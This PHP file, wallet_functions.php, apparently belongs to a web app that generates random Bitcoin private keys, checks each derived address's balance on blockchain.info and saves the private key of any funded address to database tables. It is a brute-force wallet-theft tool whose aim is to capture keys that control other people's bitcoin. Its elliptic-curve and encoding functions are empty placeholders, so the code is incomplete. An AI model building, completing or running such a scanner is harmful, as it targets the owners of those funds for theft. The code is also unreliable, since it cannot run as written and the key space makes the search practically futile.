<?php
// wallet_functions.php

// Load WordPress if you need gating; otherwise remove these two lines:
// require_once( $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php' );
// if ( ! is_user_logged_in() ) exit;

// Load credentials from environment (Railway injects these)
$dbHost = getenv('DB_HOST'); // e.g. 'mysql.hostinger.com'
$dbUser = getenv('DB_USER');
$dbPass = getenv('DB_PASS');
$dbName = getenv('DB_NAME');
$dbPort = getenv('DB_PORT') ?: 3306;

$conn = new mysqli($dbHost, $dbUser, $dbPass, $dbName, (int)$dbPort);
if ($conn->connect_error) {
    die("DB Connection failed ({$conn->connect_errno}): {$conn->connect_error}");
}

// Elliptic‑curve and Base58Check functions (copied from index.php)
function pointAdd($P, $Q, $p) { /* … your existing code … */ }
function pointDouble($P, $p) { /* … */ }
function scalarMultiply($kHex, $P, $p) { /* … */ }
function base58Check($hex) { /* … */ }

/**
 * scanAndLogWallet
 * Generates one wallet, checks balance, logs if >0.
 */
function scanAndLogWallet(): array {
    global $conn;

    // 1) Private key
    $privHex = bin2hex(random_bytes(32));

    // 2) ECC params
    $p  = gmp_init('FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F',16);
    $Gx = gmp_init('79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798',16);
    $Gy = gmp_init('483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8',16);

    // 3) Derive compressed pubkey
    $P = scalarMultiply($privHex, ['x'=>$Gx,'y'=>$Gy], $p);
    if (!$P) {
        return ['error' => 'EC error'];
    }
    $xHex   = str_pad(gmp_strval($P['x'],16),64,'0',STR_PAD_LEFT);
    $prefix = (gmp_mod($P['y'],2)==0)?'02':'03';
    $pubHex = $prefix.$xHex;

    // 4) Compute address
    $rip    = hash('ripemd160', hash('sha256', hex2bin($pubHex), true), true);
    $payload= '00'.bin2hex($rip);
    $address= base58Check($payload);

    // 5) Fetch balance
    $balJson = @file_get_contents("https://blockchain.info/balance?active={$address}");
    if ($balJson === FALSE) {
        return ['error' => 'rate limited'];
    }
    $jd  = json_decode($balJson, true);
    $bal = isset($jd[$address]['final_balance']) ? $jd[$address]['final_balance']/1e8 : 0.0;

    // 6) Log if positive
    if ($bal > 0) {
        $stmt = $conn->prepare(
            "INSERT INTO wallet_scans (private_key, btc_address, balance) VALUES (?, ?, ?)"
        );
        $stmt->bind_param("ssd", $privHex, $address, $bal);
        $stmt->execute();
        $stmt->close();

        $stmt = $conn->prepare(
            "INSERT INTO btc_wallets (private_key, btc_address, balance) VALUES (?, ?, ?)"
        );
        $stmt->bind_param("ssd", $privHex, $address, $bal);
        $stmt->execute();
        $stmt->close();
    }

    return [
        'private_key' => $privHex,
        'btc_address' => $address,
        'balance'     => $bal,
    ];
}
